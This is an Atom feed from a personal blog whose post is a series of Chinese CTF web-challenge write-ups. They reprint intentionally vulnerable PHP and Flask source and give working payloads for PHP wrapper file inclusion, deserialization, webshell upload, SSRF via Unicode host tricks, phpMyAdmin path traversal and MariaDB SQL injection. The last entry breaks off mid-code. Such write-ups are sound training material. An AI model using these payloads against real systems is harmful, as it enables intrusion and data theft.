<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>be a J0K1R</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-05-15T05:06:43.014Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Peguin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>buuoj2</title>
    <link href="http://yoursite.com/2020/05/11/buuoj2/"/>
    <id>http://yoursite.com/2020/05/11/buuoj2/</id>
    <published>2020-05-11T15:08:46.000Z</published>
    <updated>2020-05-15T05:06:43.014Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0X01-ZJCTF-2019-NiZhuanSiWei"><a href="#0X01-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="0X01:[ZJCTF 2019]NiZhuanSiWei"></a>0X01:[ZJCTF 2019]NiZhuanSiWei<a id="more"></a></h4><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>pass1:</p><p>用data协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/1.png" class="" title="examplename"><p>pass2：</p><p>用filter协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure><p>拿到base64加密的源码，解密，是个简单的序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=<span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;file=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);<span class="comment">//让file=flag.php即可</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/2.png" class="" title="examplename"><h4 id="0X02-ACTF2020-新生赛-Include"><a href="#0X02-ACTF2020-新生赛-Include" class="headerlink" title="0X02:[ACTF2020 新生赛]Include"></a>0X02:[ACTF2020 新生赛]Include</h4><p>打开题目，有一个跳转链接，点击</p><img src="/2020/05/11/buuoj2/4.png" class="" title="examplename"><p>直接用filter读取flag.php</p><img src="/2020/05/11/buuoj2/3.png" class="" title="examplename"><p>base64解密就能拿到flag</p><h4 id="0X03-ACTF2020-新生赛-Upload"><a href="#0X03-ACTF2020-新生赛-Upload" class="headerlink" title="0X03:[ACTF2020 新生赛]Upload"></a>0X03:[ACTF2020 新生赛]Upload</h4><p>查看网页源码，有js前端验证，直接去掉</p><p>上传一个php文件，提示只能上传图片文件</p><p>尝试后缀绕过，phtml成功上传，连上蚁剑，拿到flag</p><img src="/2020/05/11/buuoj2/5.png" class="" title="examplename"><p>从拿到的源码可以看到考点就是phtml</p><h4 id="0X04-De1CTF-2019-SSRF-Me"><a href="#0X04-De1CTF-2019-SSRF-Me" class="headerlink" title="0X04:[De1CTF 2019]SSRF Me"></a>0X04:[De1CTF 2019]SSRF Me</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>在/De1ta页面我们get方法传入param参数值，在cookie里面传递action和sign的值,将传递的param通过waf这个函数,waf函数过滤了以file和gopher开头的，传参构造Task类，调用exec方法，checkSign验证登录</p><img src="/2020/05/11/buuoj2/6.png" class="" title="examplename"><p>上面的分析可以知道，action=readscan或者scanread</p><img src="/2020/05/11/buuoj2/8.png" class="" title="examplename"><p>当我们传入的参数action和param经过getSign这个函数之后与sign相等，就返回true</p><p>返回true之后则进入if语句里面</p><img src="/2020/05/11/buuoj2/7.png" class="" title="examplename"><p>需要secert_key+param+action三个字符串连接起来之后进行md5加密作为返回值</p><p>调用geneSign路由可以拿到secret_key，再给param传值，param=flag.txtread,得到需要的MD5值</p><img src="/2020/05/11/buuoj2/10.png" class="" title="examplename"><h4 id="0X05-ASIS-2019-Unicorn-shop"><a href="#0X05-ASIS-2019-Unicorn-shop" class="headerlink" title="0X05:[ASIS 2019]Unicorn shop"></a>0X05:[ASIS 2019]Unicorn shop</h4><p>打开是一个购买界面，有四种商品，随便选一个，输入价格</p><img src="/2020/05/11/buuoj2/12.png" class="" title="examplename"><p>只能输入一个字符，看一下源码，找到了点提示</p><img src="/2020/05/11/buuoj2/11.png" class="" title="examplename"><p>用utf-8的编码来购买，价格要大于4号商品的价格，找了一个网站，这里记录一下</p><p><a href="https://www.compart.com/en/unicode/U+2187" target="_blank" rel="noopener">https://www.compart.com/en/unicode/U+2187</a></p><p>搜索一下thousand，找一个字符，修改0x为%即可</p><img src="/2020/05/11/buuoj2/13.png" class="" title="examplename"><h4 id="0X06-GXYCTF2019-禁止套娃"><a href="#0X06-GXYCTF2019-禁止套娃" class="headerlink" title="0X06:[GXYCTF2019]禁止套娃"></a>0X06:[GXYCTF2019]禁止套娃</h4><p>打开题目没什么提示，扫描一发</p><img src="/2020/05/11/buuoj2/14.png" class="" title="examplename"><p>发现了.git泄露，git攻击</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了很多东西，看了别的师傅的wp，说是无参RCE，学习一下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">scandir() 列出 images 目录中的文件和目录。</span><br><span class="line">readfile() 输出一个文件。</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">pos() current() 的别名。</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">array_reverse()以相反的元素顺序返回数组。</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/15.png" class="" title="examplename"><h4 id="0X07-SUCTF-2019-Pythonginx"><a href="#0X07-SUCTF-2019-Pythonginx" class="headerlink" title="0X07:[SUCTF 2019]Pythonginx"></a>0X07:[SUCTF 2019]Pythonginx</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br><span class="line">   </span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure><p>给了源码，找了资料，发现一张很有用的图片</p><img src="/2020/05/11/buuoj2/16.png" class="" title="examplename"><p>从源码中可以看到，url前面部分是suctf.cc,但是源码中进行了替换，所以c可以用c℆代替</p><p>再是有关nginx的</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Nginx配置文件</span><br><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p>payload：file://suctf.c℆sr/local/nginx/conf/nginx.conf，找到flag所在</p><img src="/2020/05/11/buuoj2/17.png" class="" title="examplename"><h4 id="0X08-GWCTF-2019-我有一个数据库"><a href="#0X08-GWCTF-2019-我有一个数据库" class="headerlink" title="0X08:[GWCTF 2019]我有一个数据库"></a>0X08:[GWCTF 2019]我有一个数据库</h4><p>一堆乱码，扫描，发现robots.txt,还找到了phpmyadmin,没有密码直接登录</p><img src="/2020/05/11/buuoj2/18.png" class="" title="examplename"><img src="/2020/05/11/buuoj2/19.png" class="" title="examplename"><p>后续思路附上一篇文章<a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener">https://www.jianshu.com/p/fb9c2ae16d09</a></p><p>payload：?target=db_datadict.php%253f/../../../../../../../../flag</p><img src="/2020/05/11/buuoj2/20.png" class="" title="examplename"><h4 id="0X09-SWPU2019-Web1"><a href="#0X09-SWPU2019-Web1" class="headerlink" title="0X09:[SWPU2019]Web1"></a>0X09:[SWPU2019]Web1</h4><p>虚假登录界面，注册登录有一个发布广告，不是sql就是xss，经过测试应该是sql，测试了挺久没有思路，找了wp，是MariaDB的sql注入</p><img src="/2020/05/11/buuoj2/21.png" class="" title="examplename"><p>过滤了什么自己去测试吧，直接附上payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>, (<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/22.png" class="" title="examplename"><h4 id="0X10-安洵杯-2019-easy-serialize-php"><a href="#0X10-安洵杯-2019-easy-serialize-php" class="headerlink" title="0X10:[安洵杯 2019]easy_serialize_php"></a>0X10:[安洵杯 2019]easy_serialize_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a 